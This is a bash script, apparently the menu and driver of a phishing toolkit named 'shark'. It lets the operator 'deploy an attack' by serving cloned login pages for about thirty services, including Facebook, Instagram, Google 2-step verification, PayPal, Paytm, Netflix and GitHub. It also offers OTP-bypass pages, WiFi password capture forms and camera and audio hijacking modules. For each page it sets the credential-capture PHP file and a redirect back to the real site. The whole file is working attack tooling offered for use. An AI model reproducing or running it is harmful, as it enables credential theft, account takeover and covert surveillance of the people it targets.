			FILE="login.php"
			oldy="https://www.facebook.com/"
			decne;;
		2 | 02)
			cd ${phish}/fb_advanced/
			decne;;
		3 | 03)
			cd ${phish}/fb_security/
			reddc="TRUE"
			FILE="login.php"
			oldy="https://www.facebook.com/"
			decne;;
		4 | 04)
			cd ${phish}/fb_messenger/
			reddc="TRUE"
			FILE="login.php"
			oldy="https://www.facebook.com/"
			decne;;
		*)
			error_msg " Invalid Option, Try Again..."
			{ sleep 1; clear; FC_OPT; };;
	esac

}
INSTA_OPT() {
echo ""
printf "${green}[${nc}01${green}]${yellow} Traditional Login Page\n\n"
printf "${green}[${nc}02${green}]${yellow} 1000+ Followers Login Page\n\n"
printf "${green}[${nc}03${green}]${yellow} Insta Blue-Tick Login Page\n\n"
printf "${green}[${nc}04${green}]${yellow} Auto Followers Login Page\n\n"
read -p $'\e[1;32m[\e[0m-\e[1;32m]\e[1;33m Select an option : \e[1;36m' pgrep
case $pgrep in 
		1 | 01) 
			cd ${phish}/instagram/
			NOTPF="login.php"
			YOTPF="posts.php"
			oldy="https://www.instagram.com"
			decne;;
		2 | 02)
			cd ${phish}/insta_followers/
			reddc="TRUE"
			FILE="login.php"
			oldy="https://www.instagram.com"
			decne;;
		3 | 03)
			cd ${phish}/ig_verify/
			mkdir drk/
			cp -R * drk/
			cd drk/
			rm -rf drk/
			decne;;
		4 | 04)
			cd ${phish}/ig_followers/
			reddc="TRUE"
			FILE="login.php"
			oldy="https://google.com/"
			decne;;
		*)
			error_msg " Invalid Option, Try Again..."
			{ sleep 1; clear; INSTA_OPT; };;
	esac

}
########
# DRIVER
########
internet
os
kill_session
msgsh
while :
do
	clear
        printf "${green}

        ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
       ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
       ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
        ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
       ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${cyan1}.beta v${VERSION}\n\n "

      printf "${green}       ╔──────────────────────────────────────╗\n"
      printf "${green}        |   ${cyan1}B  E  T  A    V  E  R  S  I  O  N  ${green}|\n"
      printf "${green}        ╚──────────────────────────────────────╝\n\n"

     printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
function banner(){	
        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m          \e[1;92m[\e[0m\e[1;37m33\e[0m\e[1;92m] \e[0m\e[1;37;46mWIFI-(adminpanel)\e[0m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m           \e[1;92m[\e[0m\e[1;37m34\e[0m\e[1;92m] \e[0m\e[1;48;5;4mWIFI-(passwd)\e[0m\n\n"            
        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m         \e[1;92m[\e[0m\e[1;37m35\e[0m\e[1;92m] \e[0m\e[1;37;42mGameid-hack\e[0m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m04\e[0m\e[1;92m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;92m[\e[0m\e[1;37m15\e[0m\e[1;92m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;92m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
        printf "\e[1;92m[\e[0m\e[1;37m05\e[0m\e[1;92m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;92m[\e[0m\e[1;37m16\e[0m\e[1;92m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;92m[\e[0m\e[1;37m27\e[0m\e[1;92m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
        printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
        printf "\e[1;92m[\e[0m\e[1;37m07\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;92m[\e[0m\e[1;37m18\e[0m\e[1;92m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;92m[\e[0m\e[1;37m29\e[0m\e[1;92m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m08\e[0m\e[1;92m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;92m[\e[0m\e[1;37m19\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;92m[\e[0m\e[1;37m30\e[0m\e[1;92m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
	printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
	printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipkart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
        read -p $'\e[1;92mshark \e[1;97m>>\e[0m ' option
}


#######
# MAIN
#######
	#banner
        banner

        if [ $option = 01 ] || [ $option = 1 ];then
		FC_OPT
	elif [ $option = 02 ] || [ $option = 2 ];then
                cd $phish/pinterest/
		reddc="TRUE"
		FILE="post.php"
		oldy="https://in.pinterest.com"
		decne
	elif [ $option = 03 ] || [ $option = 3 ];then
		INSTA_OPT
	elif [ $option = 04 ] || [ $option = 4 ];then
                cd $phish/UberEats-Phishing/
		NOTPF="posts.php"
		YOTPF="postss.php"
		oldy="https://www.ubereats.com/en-IN/"
		decne
        elif [ $option = 05 ] || [ $option = 5 ];then
                cd $phish/ola-otpbypass/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.olacabs.com"
		decne
	elif [ $option = 06 ] || [ $option = 6 ];then
		printf "\n"
		printf "$cyan1[A] Google 2-step-verification (${red}inresponsive page$cyan)

[B] Google non-verification (${green}responsive${cyan1})

⛔ENTER YOUR CHOICE : "
     read gans
		if [[ $gans == "A" || $gans == "a" ]]; then
			cd $phish/google-otp/
			NOTPF="posts.php"
			YOTPF="postss.php"
			oldy="https://accounts.google.com"
			decne
		elif [[ $gans == "B" || $gans == "b" ]]; then
			cd $phish/google/
			reddc="TRUE"
			FILE="main.php"
			oldy="https://www.google.com/account/about/"
			decne
		else
			clear
			printf "${red}Bro you type wrong!!!"
			sleep 2
			error_msg "try again!!\n"
		fi

        elif [ $option = 07 ] || [ $option = 7 ];then
                cd $phish/Paytm-Phishing/ && paytm
		break;

        elif [ $option = 08 ] || [ $option = 8 ];then
                cd $phish/Netflix/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.netflix.com/in"
                decne
	elif [ $option = 09 ] || [ $option = 9 ];then
                cd $phish/instafollow/
		reddc="TRUE"
		FILE="login.php"
		oldy="https://skweezer.net"
		decne
	elif [ $option = 10 ];then
                cd $phish/amazonsign/
		reddc="TRUE"
		FILE="posts.php"
		oldy="https://www.amazon.in"
		decne
        elif [ $option = 11 ];then
                cd $phish/whatsapp-phishing/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://web.whatsapp.com"
		decne
	elif [ $option = 12 ];then
                cd $phish/Linkedin/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.linkedin.com"
		decne
        elif [ $option = 13 ];then
                cd $phish/Hotstar-otp-bypass/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.hotstar.com/in"
		decne
        elif [ $option = 14 ];then
                cd $phish/spotify/
		reddc="TRUE"
		FILE="login.php"
		oldy="https://www.spotify.com/in"
		decne
        elif [ $option = 15 ];then
                cd $phish/github/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://github.com"
		decne
	elif [ $option = 16 ];then
                cd $phish/ipfinder/
		decne
	elif [ $option = 17 ];then
                cd $phish/Zomato-Phishing/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.zomato.com"
		decne
        elif [ $option = 18 ];then
                cd $phish/phonepay/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.phonepe.com"
		decne
	elif [ $option = 19 ];then
                cd $phish/paypal/
		#valu="19"
		reddc="TRUE"
		FILE="postss.php"
		oldy="https://www.paypal.com"
		echo
		msg "Will try to give you best paypal phishing soon!"
		sleep 5
		decne
	elif [ $option = 20 ];then
                cd $phish/telegram/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://telegram.org"
		decne
	elif [ $option = 21 ];then
                cd $phish/twitter/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://twitter.com"
		decne
	elif [ $option = 22 ];then
                cd $phish/flipkart/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.flipkart.com"
		decne
        elif [ $option = 23 ];then
                cd $phish/wordpress/
		reddc="TRUE"
		FILE="post.php"
		oldy="https://wordpress.com/"
		decne
	elif [ $option = 24 ];then
                cd $phish/snapchat/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.snapchat.com"
		decne
	elif [ $option = 25 ];then
                cd $phish/protonmail/
		reddc="TRUE"
		FILE="post.php"
		oldy="https://mail.protonmail.com/"
		decne
        elif [ $option = 26 ];then
                cd $phish/stackoverflow/
		reddc="TRUE"
		FILE="post.php"
		oldy="https://stackoverflow.com"
		decne
        elif [ $option = 27 ];then
                cd $phish/ebay/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.ebay.com/"
		decne
        elif [ $option = 28 ];then
                cd $phish/twitch/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.twitch.tv"
		decne
	elif [ $option = 29 ];then
                cd $phish/ajio/
		reddc="TRUE"
		FILE="posts.php"
		oldy="https://www.ajio.com"
		decne
	elif [ $option = 30 ];then
                cd $phish/mobikwik/
		NOTPF="post.php"
		YOTPF="posts.php"
		oldy="https://www.mobikwik.com"
		decne
	elif [ $option = 31 ];then
		cd $phish/Camera_hack && file_check
		camera_hack
	        break;

        elif [ $option = 32 ];then
		cd $phish/Audio_hack && file_check
                audio_hack
		break;

        elif [ $option = 33 ];then
                cd $phish/wiapp/
		#valu="19"
		reddc="TRUE"
		FILE="form.php"
		oldy="COUSTOM"
		decne
	elif [ $option = 34 ];then
                cd $phish/wip/
		#valu="19"
		reddc="TRUE"
		FILE="form.php"
		oldy="COUSTOM"
		decne
	elif [ $option = 35 ];then
                cd $phish/gidp/
		#valu="19"
		reddc="TRUE"
		FILE="form.php"
		oldy="COUSTOM"
		decne
	elif [ $option = 99 ];then
                printf "\n" && exit
                break;

	else
	    error_msg "Invalid option Try Again !!${white}\n"
		sleep 0.8
	fi
done

#####################################################################
#                                                                   #
#      simply changing this banner will not make you developer      #
#                   KEEP SUPPORTING                                 #
#                      THANKYOU                                     #
#                                                                   #
#####################################################################
